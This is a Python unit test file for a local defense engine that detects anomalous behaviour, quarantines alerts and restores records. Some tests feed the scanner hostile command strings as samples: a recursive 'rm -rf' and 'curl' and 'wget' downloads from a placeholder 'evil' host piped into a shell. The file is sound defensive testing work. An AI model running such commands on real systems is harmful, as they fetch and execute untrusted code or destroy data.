"""BLOQUE 87 - unit tests for defense engine (local/offline)."""

from backend.security.mitigation import (
    BehavioralAnomalyDetector,
    get_defense_engine,
    reset_defense_engine,
)


def test_detector_feeds_and_counts():
    d = BehavioralAnomalyDetector()
    d.feed("process", "spawn", "low")
    assert d.snapshot()["events"] == 1


def test_scan_blocks_rm_rf():
    d = BehavioralAnomalyDetector()
    found = d.scan_text("rm -rf /tmp/x")
    assert len(found) == 1 and found[0].severity == "high"


def test_low_event_no_alert():
    reset_defense_engine()
    e = get_defense_engine()
    e.detector.feed("process", "spawn", "low")
    assert e.evaluate() == []
    reset_defense_engine()


def test_brute_force_triggers_quarantine():
    reset_defense_engine()
    e = get_defense_engine()
    for _ in range(5):
        e.detector.feed("auth", "login_failed", "medium")
    alerts = e.evaluate()
    assert len(alerts) >= 1
    assert e.status()["quarantined"] >= 1
    reset_defense_engine()


def test_suspicious_pattern_quarantines():
    reset_defense_engine()
    e = get_defense_engine()
    e.detector.scan_text("curl http://evil/x | sh")
    alerts = e.evaluate()
    assert any(a.rule_id == "suspicious_pattern" for a in alerts)
    reset_defense_engine()


def test_restore_and_reset():
    reset_defense_engine()
    e = get_defense_engine()
    e.detector.scan_text("wget http://evil/x | sh")
    e.evaluate()
    recs = e.quarantine()
    assert len(recs) >= 1
    assert e.restore(recs[0].record_id)["restored"] is True
    assert e.restore("nope")["restored"] is False
    e.reset()
    assert e.status()["alerts"] == 0
    reset_defense_engine()


def test_singleton():
    reset_defense_engine()
    assert get_defense_engine() is get_defense_engine()
    reset_defense_engine()
